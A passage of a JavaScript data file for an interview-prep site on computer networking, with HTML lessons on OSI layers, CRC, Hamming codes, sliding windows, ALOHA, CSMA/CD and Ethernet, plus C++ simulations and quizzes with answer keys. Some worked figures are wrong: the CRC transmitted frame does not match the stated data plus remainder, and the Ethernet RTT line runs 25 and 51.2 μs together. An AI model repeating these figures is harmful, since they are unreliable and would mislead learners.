class="learn-h">Important Devices at Each Layer</div><ul class="learn-list"><li><b>Layer 1 (Physical):</b> Hubs, Repeaters, Cables (Ethernet, Fiber)</li><li><b>Layer 2 (Data Link):</b> Switches, Bridges (operate on MAC addresses)</li><li><b>Layer 3 (Network):</b> Routers, Layer-3 Switches (operate on IP addresses)</li><li><b>Layer 4 (Transport):</b> Firewalls (stateful inspection), Load Balancers</li><li><b>Layer 7 (Application):</b> Application-level gateways, WAFs, Reverse Proxies</li></ul><div class="learn-tip"><b>Tip:</b> In DE Shaw interviews, you might be asked: "At which layer does a switch operate vs. a router?" Switch = Layer 2 (MAC), Router = Layer 3 (IP). A Layer-3 switch can do both.</div></div><div class="learn-section"><div class="learn-h">Interview Essentials</div><ul class="learn-list"><li>Know all 7 OSI layers and their PDUs by heart.</li><li>Understand encapsulation/de-encapsulation with a real example.</li><li>Be able to map TCP/IP layers to OSI layers.</li><li>Know which protocols belong to which layer.</li><li>Understand the difference between logical (IP) and physical (MAC) addressing.</li><li>The Presentation layer handles <b>encryption</b> (TLS), <b>compression</b>, and <b>data format translation</b>.</li><li>The Session layer manages <b>dialog control</b> (simplex, half-duplex, full-duplex) and <b>synchronization</b>.</li></ul></div>',
          code: `// === Network Layer Simulation in C++ ===
// Demonstrates packet encapsulation through OSI layers

#include <iostream>
#include <string>
#include <vector>
using namespace std;

// Simulating PDU at each layer
struct PhysicalFrame {
    string bits; // raw bits
};

struct DataLinkFrame {
    string srcMAC;
    string dstMAC;
    string payload; // network layer packet
    string crc;     // error detection
};

struct NetworkPacket {
    string srcIP;
    string dstIP;
    int ttl;
    string payload; // transport segment
};

struct TransportSegment {
    int srcPort;
    int dstPort;
    int seqNum;
    int ackNum;
    string flags; // SYN, ACK, FIN etc.
    string payload; // application data
};

// Encapsulation demonstration
void demonstrateEncapsulation() {
    // Step 1: Application layer creates data
    string appData = "GET / HTTP/1.1\\r\\nHost: www.example.com\\r\\n\\r\\n";
    cout << "=== Application Layer ===" << endl;
    cout << "Data: " << appData.substr(0, 30) << "..." << endl;

    // Step 2: Transport layer adds TCP header
    TransportSegment seg;
    seg.srcPort = 49152; // ephemeral port
    seg.dstPort = 80;    // HTTP
    seg.seqNum = 1000;
    seg.ackNum = 0;
    seg.flags = "SYN";
    seg.payload = appData;
    cout << "\\n=== Transport Layer ===" << endl;
    cout << "Segment: [SrcPort:" << seg.srcPort
         << " DstPort:" << seg.dstPort
         << " Seq:" << seg.seqNum << "] + Data" << endl;

    // Step 3: Network layer adds IP header
    NetworkPacket pkt;
    pkt.srcIP = "192.168.1.100";
    pkt.dstIP = "93.184.216.34"; // example.com
    pkt.ttl = 64;
    pkt.payload = "TCP_SEGMENT";
    cout << "\\n=== Network Layer ===" << endl;
    cout << "Packet: [SrcIP:" << pkt.srcIP
         << " DstIP:" << pkt.dstIP
         << " TTL:" << pkt.ttl << "] + Segment" << endl;

    // Step 4: Data Link layer adds frame header/trailer
    DataLinkFrame frame;
    frame.srcMAC = "AA:BB:CC:DD:EE:01";
    frame.dstMAC = "AA:BB:CC:DD:EE:02"; // next hop router MAC
    frame.payload = "IP_PACKET";
    frame.crc = "0xABCD1234"; // CRC-32 checksum
    cout << "\\n=== Data Link Layer ===" << endl;
    cout << "Frame: [SrcMAC:" << frame.srcMAC
         << " DstMAC:" << frame.dstMAC
         << "] + Packet + [CRC:" << frame.crc << "]" << endl;

    // Step 5: Physical layer converts to bits
    cout << "\\n=== Physical Layer ===" << endl;
    cout << "Bits: 01101001 10110100 11001010 ..." << endl;
}

// Simple routing table lookup
struct RouteEntry {
    string network;
    string mask;
    string nextHop;
    string iface;
};

void routingTableLookup() {
    vector<RouteEntry> table = {
        {"192.168.1.0", "255.255.255.0", "0.0.0.0", "eth0"},
        {"10.0.0.0",    "255.0.0.0",     "192.168.1.1", "eth0"},
        {"0.0.0.0",     "0.0.0.0",       "192.168.1.1", "eth0"} // default
    };

    cout << "\\n=== Routing Table ===" << endl;
    cout << "Network\\t\\tMask\\t\\t\\tNext Hop\\tInterface" << endl;
    for (auto& r : table) {
        cout << r.network << "\\t" << r.mask << "\\t"
             << r.nextHop << "\\t\\t" << r.iface << endl;
    }
}

int main() {
    demonstrateEncapsulation();
    routingTableLookup();
    return 0;
}`,
          problems: [
            ['Basics of Computer Networking', 'https://www.geeksforgeeks.org/basics-computer-networking/', 'Easy'],
            ['OSI Model Practice Problems', 'https://www.geeksforgeeks.org/osi-model-practice-problems/', 'Medium'],
            ['TCP/IP Model Questions', 'https://www.geeksforgeeks.org/tcp-ip-model/', 'Easy'],
          ],
          mcqs: [
            {q: 'Which OSI layer is responsible for routing packets between different networks?', o: ['Data Link Layer', 'Transport Layer', 'Network Layer', 'Session Layer'], a: 2},
            {q: 'In the TCP/IP model, which layer combines the functionality of OSI layers 5, 6, and 7?', o: ['Internet Layer', 'Transport Layer', 'Application Layer', 'Network Access Layer'], a: 2},
            {q: 'What is the PDU (Protocol Data Unit) at the Data Link layer?', o: ['Packet', 'Segment', 'Frame', 'Bit'], a: 2},
          ],
        },
      ]
    },

    // ==================== TAB 2: Data Link Layer ====================
    {
      id: 'dl', t: 'Data Link Layer',
      topics: [
        {
          t: 'Error Detection & Flow Control',
          learn: '<div class="learn-section"><div class="learn-h">Introduction to Error Detection</div><p class="learn-p">When data is transmitted over a physical medium (copper wire, fiber, wireless), <b>noise and interference</b> can corrupt bits. The <b>Data Link Layer</b> is responsible for detecting (and sometimes correcting) these errors before passing data up to the Network Layer. Error detection ensures <b>data integrity</b> at the frame level.</p><p class="learn-p">There are two broad strategies: <b>Error Detection</b> (detect and request retransmission) and <b>Error Correction</b> (detect and fix without retransmission, also called <b>Forward Error Correction / FEC</b>). In practice, most wired networks rely on detection + retransmission, while wireless or satellite links may use FEC due to high latency.</p></div><div class="learn-section"><div class="learn-h">Types of Errors</div><ul class="learn-list"><li><b>Single-bit error:</b> Only one bit in the data unit is flipped. Rare in serial transmission but possible.</li><li><b>Burst error:</b> Two or more consecutive bits are corrupted. More common in real-world channels. The <b>burst length</b> is from the first to the last corrupted bit.</li></ul></div><div class="learn-section"><div class="learn-h">Error Detection Techniques</div><p class="learn-p"><b>1. Parity Check (Single Bit Parity):</b></p><p class="learn-p">A <b>parity bit</b> is appended to the data. In <b>even parity</b>, the total number of 1s (data + parity) is made even. In <b>odd parity</b>, it is made odd.</p><div class="learn-code">Data: 1011001  (four 1s — even count)\nEven Parity Bit: 0  &rarr; 10110010  (still four 1s)\nOdd Parity Bit:  1  &rarr; 10110011  (five 1s)</div><p class="learn-p">Single-bit parity can detect <b>odd number of bit errors</b> but fails for even number of errors. It cannot correct errors.</p><p class="learn-p"><b>2. Two-Dimensional Parity:</b></p><p class="learn-p">Data is arranged in a matrix. Parity is computed for each row AND each column. This can detect <b>all single-bit, double-bit, and some triple-bit errors</b>. It can also <b>correct single-bit errors</b> by identifying the row and column intersection.</p><div class="learn-code">Data Matrix:        Row Parity:\n1 0 1 1  |  1\n0 1 1 0  |  0\n1 1 0 1  |  1\n---------+\n0 0 0 0    (column parity)</div><p class="learn-p"><b>3. Checksum:</b></p><p class="learn-p">Used at the Transport layer (TCP/UDP) and also at the Network layer (IP header checksum). The sender divides data into fixed-size segments, sums them using <b>1\'s complement arithmetic</b>, and sends the complement of the sum as the checksum. The receiver adds all segments + checksum; if the result is all 1s, no error is detected.</p><div class="learn-code">Segments: 10011001, 11100010, 00100100\nSum (1\'s complement): 10011001 + 11100010 = 101111011\nWrap carry: 01111100\nAdd next:   01111100 + 00100100 = 10100000\nChecksum = complement = 01011111</div><div class="learn-warn"><b>Warning:</b> Checksum can miss errors where two segments have complementary bit flips that cancel out in the sum. CRC is more robust for link-layer error detection.</div><p class="learn-p"><b>4. Cyclic Redundancy Check (CRC):</b></p><p class="learn-p">CRC is the <b>most widely used</b> error detection method at the Data Link layer (used in Ethernet, Wi-Fi, USB, etc.). It treats the bit string as a polynomial and divides it by a <b>generator polynomial</b>. The remainder is appended to the data as the CRC code.</p><div class="learn-code">Data:       1101011011  (message M)\nGenerator:  10011       (polynomial G, degree 4)\n\nStep 1: Append (degree of G) zeros to M:\n        11010110110000\nStep 2: Divide by G using XOR (modulo-2 division)\nStep 3: Remainder = 1110  (this is the CRC)\nStep 4: Transmit: 11010111101110\n\nReceiver divides received data by G.\nIf remainder = 0, no error detected.</div><p class="learn-p">CRC can detect: all single-bit errors, all double-bit errors (if G has at least 3 terms), all odd number of errors (if G contains x+1 as factor), and all burst errors shorter than the CRC degree.</p><div class="learn-tip"><b>Tip:</b> Common CRC polynomials: CRC-8, CRC-16, CRC-32 (used in Ethernet with generator 0x04C11DB7). CRC-32 can detect any burst error of length &le; 32.</div></div><div class="learn-section"><div class="learn-h">Hamming Code (Error Correction)</div><p class="learn-p">Hamming code is a <b>Forward Error Correction (FEC)</b> technique that can <b>detect up to 2-bit errors and correct 1-bit errors</b>. It uses <b>redundant parity bits</b> placed at positions that are powers of 2 (1, 2, 4, 8, ...).</p><p class="learn-p">For a data word of <b>m</b> bits, we need <b>r</b> redundant bits such that <code>2^r &ge; m + r + 1</code>. Each parity bit covers specific bit positions based on the binary representation of the position number.</p><div class="learn-code">Example: Data = 1011 (4 bits, need r=3 parity bits)\nPositions: P1 P2 D1 P4 D2 D3 D4\n            _  _  1  _  0  1  1\n\nP1 covers positions with bit 0 set: 1,3,5,7  &rarr; P1=1^0^1 = 0\nP2 covers positions with bit 1 set: 2,3,6,7  &rarr; P2=1^1^1 = 1\nP4 covers positions with bit 2 set: 4,5,6,7  &rarr; P4=0^1^1 = 0\n\nHamming code: 0 1 1 0 0 1 1</div></div><div class="learn-section"><div class="learn-h">Flow Control</div><p class="learn-p">Flow control ensures the <b>sender does not overwhelm the receiver</b> with data faster than it can process. At the Data Link layer, flow control is managed between adjacent nodes (hop-by-hop). The main protocols are:</p><p class="learn-p"><b>1. Stop-and-Wait Protocol:</b></p><ul class="learn-list"><li>Sender sends one frame, then waits for ACK.</li><li>After receiving ACK, sends the next frame.</li><li>Simple but <b>very inefficient</b> — utilization = <code>1 / (1 + 2a)</code> where <code>a = propagation delay / transmission delay</code>.</li><li>Uses a <b>timeout</b> for retransmission if ACK is lost.</li><li>Sequence numbers 0 and 1 (alternating bit protocol) to handle duplicate frames.</li></ul><div class="learn-code">Efficiency = T_trans / (T_trans + 2 * T_prop)\n           = 1 / (1 + 2a)    where a = T_prop / T_trans\n\nExample: Frame size = 1000 bits, Link = 1 Mbps, Prop delay = 5 ms\nT_trans = 1000 / 10^6 = 1 ms\na = 5 / 1 = 5\nEfficiency = 1 / (1 + 10) = 9.09%  (very low!)</div><p class="learn-p"><b>2. Sliding Window Protocols:</b></p><p class="learn-p">To improve utilization, we allow the sender to transmit <b>multiple frames</b> before waiting for ACKs. The <b>window size (W)</b> determines how many unacknowledged frames can be in flight.</p><div class="learn-code">Efficiency = min(1, W / (1 + 2a))    for W frames\n\nWith W = 11 and a = 5:\nEfficiency = 11 / 11 = 100%!</div><p class="learn-p"><b>Go-Back-N (GBN):</b></p><ul class="learn-list"><li>Sender window size = W, Receiver window size = 1.</li><li>If frame <code>i</code> is lost, receiver discards all subsequent frames. Sender retransmits from frame <code>i</code> onward.</li><li>Sequence number bits n: <code>W &le; 2^n - 1</code>.</li><li>Cumulative ACKs — ACK(n) acknowledges all frames up to n.</li></ul><p class="learn-p"><b>Selective Repeat (SR):</b></p><ul class="learn-list"><li>Sender window size = W, Receiver window size = W.</li><li>Receiver buffers out-of-order frames. Only the lost frame is retransmitted.</li><li>Sequence number bits n: <code>W &le; 2^(n-1)</code>.</li><li>Individual (selective) ACKs.</li></ul><div class="learn-tip"><b>Tip:</b> Interview favorite: "Why is the max window size for GBN = 2^n - 1 but for SR = 2^(n-1)?" Because in SR, receiver and sender windows can overlap in sequence number space, causing ambiguity. The constraint W &le; 2^(n-1) prevents this.</div></div><div class="learn-section"><div class="learn-h">Piggybacking</div><p class="learn-p">In full-duplex communication, <b>piggybacking</b> means attaching an ACK to an outgoing data frame instead of sending a separate ACK frame. This improves bandwidth utilization by reducing the number of frames on the network.</p></div><div class="learn-section"><div class="learn-h">Comparison Table</div><table class="learn-table"><tr><th>Feature</th><th>Stop-and-Wait</th><th>Go-Back-N</th><th>Selective Repeat</th></tr><tr><td>Sender Window</td><td>1</td><td>W (up to 2^n - 1)</td><td>W (up to 2^(n-1))</td></tr><tr><td>Receiver Window</td><td>1</td><td>1</td><td>W</td></tr><tr><td>Retransmission</td><td>Single frame</td><td>All from lost frame</td><td>Only lost frame</td></tr><tr><td>ACK Type</td><td>Individual</td><td>Cumulative</td><td>Individual</td></tr><tr><td>Complexity</td><td>Low</td><td>Medium</td><td>High</td></tr><tr><td>Efficiency</td><td>Low</td><td>Medium</td><td>High</td></tr></table></div>',
          code: `// === CRC and Sliding Window Simulation in C++ ===
#include <iostream>
#include <string>
#include <vector>
#include <queue>
using namespace std;

// ---- CRC Computation ----
string xorStrings(string a, string b) {
    string result;
    for (int i = 1; i < (int)b.size(); i++) {
        result += (a[i] == b[i]) ? '0' : '1';
    }
    return result;
}

string computeCRC(string data, string generator) {
    int genLen = generator.size();
    // Append (genLen - 1) zeros to data
    string augmented = data + string(genLen - 1, '0');

    // Initial dividend
    string temp = augmented.substr(0, genLen);

    for (int i = genLen; i <= (int)augmented.size(); i++) {
        // If leading bit is 1, XOR with generator; else XOR with zeros
        if (temp[0] == '1') {
            temp = xorStrings(temp, generator);
        } else {
            temp = xorStrings(temp, string(genLen, '0'));
        }
        if (i < (int)augmented.size()) {
            temp += augmented[i];
        }
    }
    return temp; // This is the CRC remainder
}

void demonstrateCRC() {
    string data = "1101011011";
    string generator = "10011";

    string crc = computeCRC(data, generator);
    string transmitted = data + crc;

    cout << "=== CRC Computation ===" << endl;
    cout << "Data:        " << data << endl;
    cout << "Generator:   " << generator << endl;
    cout << "CRC:         " << crc << endl;
    cout << "Transmitted: " << transmitted << endl;

    // Verify at receiver
    string recvCRC = computeCRC(transmitted, generator);
    cout << "Receiver remainder: " << recvCRC;
    bool allZero = true;
    for (char c : recvCRC) if (c != '0') allZero = false;
    cout << (allZero ? " (No error)" : " (Error detected!)") << endl;
}

// ---- Stop-and-Wait Simulation ----
void stopAndWait(int totalFrames) {
    cout << "\\n=== Stop-and-Wait Protocol ===" << endl;
    int seq = 0;
    for (int i = 0; i < totalFrames; i++) {
        cout << "Sender: Send Frame " << i << " (seq=" << seq << ")" << endl;
        // Simulate: assume ACK received
        cout << "Receiver: ACK " << seq << " received" << endl;
        seq = 1 - seq; // alternate 0 and 1
    }
}

// ---- Go-Back-N Simulation ----
void goBackN(int totalFrames, int windowSize, int lostFrame) {
    cout << "\\n=== Go-Back-N (W=" << windowSize
         << ", lost frame=" << lostFrame << ") ===" << endl;
    int base = 0, nextSeq = 0;

    while (base < totalFrames) {
        // Send up to window size
        while (nextSeq < base + windowSize && nextSeq < totalFrames) {
            cout << "Sender: Send Frame " << nextSeq << endl;
            nextSeq++;
        }
        // Simulate ACKs
        if (base == lostFrame) {
            cout << "** Frame " << lostFrame << " LOST! **" << endl;
            cout << "Timeout! Retransmit from frame " << base << endl;
            nextSeq = base; // go back to base
            lostFrame = -1; // don't lose again
        } else {
            cout << "Receiver: ACK " << base << endl;
            base++;
        }
    }
    cout << "All " << totalFrames << " frames delivered." << endl;
}

// ---- Selective Repeat Simulation ----
void selectiveRepeat(int totalFrames, int windowSize, int lostFrame) {
    cout << "\\n=== Selective Repeat (W=" << windowSize
         << ", lost frame=" << lostFrame << ") ===" << endl;
    vector<bool> acked(totalFrames, false);
    int base = 0;

    // Send initial window
    for (int i = 0; i < min(windowSize, totalFrames); i++) {
        cout << "Sender: Send Frame " << i << endl;
    }

    // Simulate ACKs (all except lost frame)
    for (int i = 0; i < min(windowSize, totalFrames); i++) {
        if (i == lostFrame) {
            cout << "** Frame " << lostFrame << " LOST! **" << endl;
        } else {
            cout << "Receiver: ACK " << i << endl;
            acked[i] = true;
        }
    }
    // Retransmit only lost frame
    cout << "Timeout for frame " << lostFrame << " -> Retransmit" << endl;
    cout << "Sender: Resend Frame " << lostFrame << endl;
    acked[lostFrame] = true;
    cout << "Receiver: ACK " << lostFrame << endl;
    cout << "Window slides forward." << endl;
}

int main() {
    demonstrateCRC();
    stopAndWait(4);
    goBackN(8, 4, 2);
    selectiveRepeat(8, 4, 1);
    return 0;
}`,
          problems: [
            ['CRC Calculation Practice', 'https://www.geeksforgeeks.org/cyclic-redundancy-check-python/', 'Medium'],
            ['Hamming Code Problem', 'https://www.geeksforgeeks.org/hamming-code-in-computer-network/', 'Medium'],
            ['Sliding Window Maximum (LeetCode 239)', 'https://leetcode.com/problems/sliding-window-maximum/', 'Hard'],
          ],
          mcqs: [
            {q: 'In Go-Back-N, if the sequence number field is 4 bits, what is the maximum sender window size?', o: ['16', '15', '8', '7'], a: 1},
            {q: 'Which error detection method is used in Ethernet frames?', o: ['Parity Check', 'Checksum', 'CRC-32', 'Hamming Code'], a: 2},
            {q: 'In Selective Repeat, the maximum window size with n-bit sequence numbers is:', o: ['2^n', '2^n - 1', '2^(n-1)', '2^(n-1) - 1'], a: 2},
          ],
        },
        {
          t: 'MAC Protocols & Ethernet',
          learn: '<div class="learn-section"><div class="learn-h">Introduction to MAC (Medium Access Control)</div><p class="learn-p">When multiple devices share a common communication channel (e.g., a bus topology, wireless medium), we need a mechanism to decide <b>who gets to transmit and when</b>. The <b>MAC sublayer</b> of the Data Link Layer handles this. MAC protocols are critical for avoiding <b>collisions</b> — situations where two or more stations transmit simultaneously, corrupting each other\'s signals.</p><p class="learn-p">MAC protocols are broadly classified into three categories:</p><ol class="learn-list"><li><b>Random Access (Contention-based):</b> Any station can transmit at any time. Collisions are possible and handled. Examples: ALOHA, CSMA, CSMA/CD, CSMA/CA.</li><li><b>Controlled Access:</b> Stations take turns or get permission. Examples: Polling, Token Passing, Reservation.</li><li><b>Channelization:</b> The channel is divided among stations. Examples: FDMA, TDMA, CDMA.</li></ol></div><div class="learn-section"><div class="learn-h">ALOHA Protocols</div><p class="learn-p"><b>Pure ALOHA:</b> Stations transmit whenever they have data. If a collision occurs (detected by lack of ACK), the station waits a <b>random backoff time</b> and retransmits.</p><div class="learn-code">Vulnerable period = 2 * T_frame\nMax throughput = 1/(2e) ≈ 18.4% at load G = 0.5\nS = G * e^(-2G)</div><p class="learn-p"><b>Slotted ALOHA:</b> Time is divided into slots equal to one frame transmission time. Stations can only transmit at the <b>beginning of a slot</b>. This halves the vulnerable period.</p><div class="learn-code">Vulnerable period = T_frame  (halved!)\nMax throughput = 1/e ≈ 36.8% at load G = 1.0\nS = G * e^(-G)</div><div class="learn-tip"><b>Tip:</b> Slotted ALOHA doubles the throughput of Pure ALOHA by reducing the vulnerable period. This is a very common numerical question in interviews.</div></div><div class="learn-section"><div class="learn-h">CSMA (Carrier Sense Multiple Access)</div><p class="learn-p">CSMA improves on ALOHA by having stations <b>listen to the channel before transmitting</b> ("carrier sensing"). If the channel is busy, the station defers. There are three persistence strategies:</p><ul class="learn-list"><li><b>1-Persistent CSMA:</b> If channel is idle, transmit immediately. If busy, keep sensing and transmit as soon as it becomes idle. High collision probability.</li><li><b>Non-Persistent CSMA:</b> If channel is busy, wait a random time before sensing again. Lower collision rate but higher delay.</li><li><b>p-Persistent CSMA:</b> If channel is idle, transmit with probability <b>p</b> and defer with probability <b>1-p</b>. Balances throughput and delay.</li></ul></div><div class="learn-section"><div class="learn-h">CSMA/CD (Collision Detection) — Ethernet</div><p class="learn-p">Used in <b>wired Ethernet (IEEE 802.3)</b>. Stations sense the medium AND <b>detect collisions while transmitting</b>. If a collision is detected, the station aborts transmission, sends a <b>jam signal</b>, and uses <b>Binary Exponential Backoff (BEB)</b> to determine retry time.</p><div class="learn-code">CSMA/CD Algorithm:\n1. Sense channel. If idle, transmit.\n2. If busy, wait until idle, then transmit.\n3. While transmitting, monitor for collision.\n4. If collision detected:\n   a. Send JAM signal (48 bits).\n   b. Increment attempt counter n.\n   c. Choose random k from [0, 2^min(n,10) - 1].\n   d. Wait k * slot_time, then go to step 1.\n5. After 16 failed attempts, report failure.</div><p class="learn-p"><b>Minimum frame size constraint:</b> For collision detection to work, a frame must be long enough that the sender is still transmitting when the collision signal arrives back. This gives us:</p><div class="learn-code">Min frame size = 2 * propagation_delay * bandwidth\n\nFor Ethernet (10 Mbps, max 2500m, prop speed ≈ 2*10^8 m/s):\nRTT = 2 * 2500 / (2*10^8) = 25 &mu;s = 51.2 &mu;s (with repeaters)\nMin frame = 51.2 &mu;s * 10 Mbps = 512 bits = 64 bytes\n\nThis is why Ethernet has a minimum frame size of 64 bytes!</div><div class="learn-warn"><b>Warning:</b> CSMA/CD does NOT work in wireless networks because of the <b>hidden terminal problem</b> — a station may not be able to hear another distant station\'s transmission. Wireless uses CSMA/CA instead.</div></div><div class="learn-section"><div class="learn-h">CSMA/CA (Collision Avoidance) — Wi-Fi</div><p class="learn-p">Used in <b>wireless networks (IEEE 802.11)</b>. Since wireless stations cannot easily detect collisions, CSMA/CA tries to <b>avoid</b> them using:</p><ul class="learn-list"><li><b>IFS (Inter-Frame Spacing):</b> Mandatory gap between frames.</li><li><b>Contention Window:</b> Random backoff before transmitting.</li><li><b>RTS/CTS handshake:</b> Request to Send / Clear to Send mechanism to reserve the channel and solve the hidden terminal problem.</li><li><b>ACK:</b> Receiver sends ACK; if no ACK, sender retransmits.</li></ul></div><div class="learn-section"><div class="learn-h">Ethernet (IEEE 802.3)</div><p class="learn-p">Ethernet is the <b>most widely used LAN technology</b>. Modern Ethernet typically uses <b>switches</b> (not hubs), creating point-to-point full-duplex links where CSMA/CD is no longer needed.</p><p class="learn-p"><b>Ethernet Frame Format:</b></p><div class="learn-code">| Preamble | SFD | Dst MAC | Src MAC | Type/Len | Payload   | FCS  |\n| 7 bytes  | 1B  | 6 bytes | 6 bytes | 2 bytes  | 46-1500 B | 4B   |\n\nPreamble:  7 bytes of 10101010 for clock synchronization\nSFD:       10101011 (Start Frame Delimiter)\nDst MAC:   Destination MAC address (6 bytes / 48 bits)\nSrc MAC:   Source MAC address\nType/Len:  EtherType (e.g., 0x0800 = IPv4, 0x86DD = IPv6)\nPayload:   46 to 1500 bytes (padded if &lt; 46)\nFCS:       Frame Check Sequence (CRC-32)</div><p class="learn-p"><b>MAC Addresses:</b> A MAC address is a <b>48-bit (6-byte)</b> hardware address, usually written in hex: <code>AA:BB:CC:DD:EE:FF</code>. The first 3 bytes are the <b>OUI (Organizationally Unique Identifier)</b> assigned by IEEE, and the last 3 bytes are assigned by the manufacturer. <code>FF:FF:FF:FF:FF:FF</code> is the <b>broadcast MAC address</b>.</p></div><div class="learn-section"><div class="learn-h">Ethernet Evolution</div><table class="learn-table"><tr><th>Standard</th><th>Speed</th><th>Medium</th><th>Max Distance</th></tr><tr><td>10BASE-T</td><td>10 Mbps</td><td>Twisted Pair</td><td>100m</td></tr><tr><td>100BASE-TX (Fast Ethernet)</td><td>100 Mbps</td><td>Cat-5 UTP</td><td>100m</td></tr><tr><td>1000BASE-T (Gigabit)</td><td>1 Gbps</td><td>Cat-5e/Cat-6</td><td>100m</td></tr><tr><td>10GBASE-T</td><td>10 Gbps</td><td>Cat-6a/Cat-7</td><td>100m</td></tr></table></div><div class="learn-section"><div class="learn-h">Switches vs Hubs</div><table class="learn-table"><tr><th>Feature</th><th>Hub</th><th>Switch</th></tr><tr><td>Layer</td><td>Physical (L1)</td><td>Data Link (L2)</td></tr><tr><td>Forwarding</td><td>Broadcasts to all ports</td><td>Forwards to specific port (MAC table)</td></tr><tr><td>Collision Domain</td><td>Shared (all ports)</td><td>Separate per port</td></tr><tr><td>Duplex</td><td>Half-duplex</td><td>Full-duplex</td></tr><tr><td>Intelligence</td><td>None</td><td>Learns MAC addresses</td></tr></table><div class="learn-tip"><b>Tip:</b> A switch <b>learns</b> which MAC address is on which port by examining the source MAC of incoming frames. It maintains a <b>MAC address table (CAM table)</b>. If the destination MAC is unknown, it floods the frame to all ports (except the source port).</div></div><div class="learn-section"><div class="learn-h">ARP (Address Resolution Protocol)</div><p class="learn-p">ARP maps an <b>IP address to a MAC address</b> within a local network. When Host A wants to send a frame to Host B on the same subnet, it needs B\'s MAC address. A sends an <b>ARP Request</b> (broadcast) and B replies with an <b>ARP Reply</b> (unicast) containing its MAC. The mapping is cached in the <b>ARP table</b>.</p><div class="learn-code">ARP Request: "Who has 192.168.1.5? Tell 192.168.1.1"\n   Src MAC: AA:BB:CC:DD:EE:01  Dst MAC: FF:FF:FF:FF:FF:FF\n\nARP Reply: "192.168.1.5 is at AA:BB:CC:DD:EE:05"\n   Src MAC: AA:BB:CC:DD:EE:05  Dst MAC: AA:BB:CC:DD:EE:01</div></div>',
          code: `// === CSMA/CD Simulation and Ethernet Frame Parser in C++ ===
#include <iostream>
#include <string>
#include <vector>
#include <cstdlib>
#include <ctime>
#include <cmath>
#include <iomanip>
using namespace std;

// ---- Binary Exponential Backoff (BEB) ----
int binaryExponentialBackoff(int collisionCount) {
    // k chosen from [0, 2^min(n, 10) - 1]
    int n = min(collisionCount, 10);
    int maxSlots = (1 << n); // 2^n
    int k = rand() % maxSlots;
    return k; // return number of slot times to wait
}

void simulateCSMACD(int numStations) {
    cout << "=== CSMA/CD Simulation ===" << endl;
    const int SLOT_TIME_US = 512; // 512-bit time for 10 Mbps Ethernet = 51.2 us
    srand(time(0));

    for (int station = 0; station < numStations; station++) {
        int attempts = 0;
        bool transmitted = false;

        while (!transmitted && attempts < 16) {
            // Sense channel (simulate random collision)
            bool collision = (rand() % 3 == 0); // 33% collision chance

            if (collision && attempts < 15) {
                attempts++;
                int backoffSlots = binaryExponentialBackoff(attempts);
                int waitTime = backoffSlots * SLOT_TIME_US;
                cout << "Station " << station << ": Collision #" << attempts
                     << " -> backoff " << backoffSlots << " slots ("
                     << waitTime << " us)" << endl;
            } else {
                transmitted = true;
                cout << "Station " << station << ": Frame transmitted successfully"
                     << " after " << attempts << " collisions" << endl;
            }
        }
        if (!transmitted) {
            cout << "Station " << station << ": FAILED after 16 attempts!" << endl;
        }
    }
}

// ---- Ethernet Frame Structure ----
struct EthernetFrame {
    string dstMAC;    // 6 bytes
    string srcMAC;    // 6 bytes
    uint16_t etherType; // 2 bytes (0x0800 = IPv4)
    string payload;   // 46-1500 bytes
    uint32_t fcs;     // 4 bytes CRC-32

    void display() {
        cout << "\\n=== Ethernet Frame ===" << endl;
        cout << "Dst MAC:    " << dstMAC << endl;
        cout << "Src MAC:    " << srcMAC << endl;
        cout << "EtherType:  0x" << hex << setfill('0') << setw(4)
             << etherType << dec << endl;
        cout << "Payload:    " << payload.substr(0, 40) << "..." << endl;
        cout << "Payload Sz: " << payload.size() << " bytes" << endl;
        cout << "FCS (CRC):  0x" << hex << fcs << dec << endl;
    }
};

// ---- ARP Table Simulation ----
struct ARPEntry {
    string ip;
    string mac;
    int ttl; // seconds remaining
};

class ARPTable {
    vector<ARPEntry> table;
public:
    void addEntry(string ip, string mac, int ttl = 300) {
        // Check if entry exists, update if so
        for (auto& e : table) {
            if (e.ip == ip) { e.mac = mac; e.ttl = ttl; return; }
        }
        table.push_back({ip, mac, ttl});
    }

    string resolve(string ip) {
        for (auto& e : table) {
            if (e.ip == ip) return e.mac;
        }
        return ""; // not found, need ARP request
    }

    void display() {
        cout << "\\n=== ARP Table ===" << endl;
        cout << "IP Address\\t\\tMAC Address\\t\\tTTL" << endl;
        for (auto& e : table) {
            cout << e.ip << "\\t" << e.mac << "\\t" << e.ttl << "s" << endl;
        }
    }
};

// ---- ALOHA Throughput Calculator ----
void alohaCalculator() {
    cout << "\\n=== ALOHA Throughput ===" << endl;
    double G_values[] = {0.25, 0.5, 1.0, 1.5, 2.0};
    cout << "Load G\\tPure ALOHA\\tSlotted ALOHA" << endl;
    for (double G : G_values) {
        double pure = G * exp(-2.0 * G);
        double slotted = G * exp(-G);
        cout << fixed << setprecision(2) << G << "\\t"
             << setprecision(4) << pure << "\\t\\t"
             << slotted << endl;
    }
    cout << "\\nMax Pure ALOHA:   S = " << 1.0/(2*exp(1.0))
         << " at G = 0.5" << endl;
    cout << "Max Slotted ALOHA: S = " << 1.0/exp(1.0)
         << " at G = 1.0" << endl;
}

int main() {
    simulateCSMACD(5);

    EthernetFrame frame;
    frame.dstMAC = "AA:BB:CC:DD:EE:02";
    frame.srcMAC = "AA:BB:CC:DD:EE:01";
    frame.etherType = 0x0800; // IPv4
    frame.payload = "HTTP GET / request data goes here...";
    frame.fcs = 0xABCD1234;
    frame.display();

    ARPTable arp;
    arp.addEntry("192.168.1.1", "AA:BB:CC:DD:EE:01");
    arp.addEntry("192.168.1.2", "AA:BB:CC:DD:EE:02");
    arp.addEntry("192.168.1.3", "AA:BB:CC:DD:EE:03");
    arp.display();

    string resolved = arp.resolve("192.168.1.2");
    cout << "\\nResolve 192.168.1.2 -> " << resolved << endl;

    alohaCalculator();
    return 0;
}`,
          problems: [
            ['Ethernet Frame Size Calculation', 'https://www.geeksforgeeks.org/ethernet-frame-format/', 'Easy'],
            ['CSMA/CD Efficiency Problems', 'https://www.geeksforgeeks.org/efficiency-of-csma-cd/', 'Medium'],
            ['ALOHA Throughput Numerical', 'https://www.geeksforgeeks.org/difference-between-pure-aloha-and-slotted-aloha/', 'Medium'],
          ],
          mcqs: [
            {q: 'What is the minimum Ethernet frame size and why?', o: ['32 bytes — to fill the bus', '64 bytes — to ensure collision detection works within 2 * propagation delay', '128 bytes — standard IEEE requirement', '46 bytes — minimum payload size'], a: 1},
            {q: 'The maximum throughput of Slotted ALOHA is approximately:', o: ['18.4%', '36.8%', '50%', '100%'], a: 1},
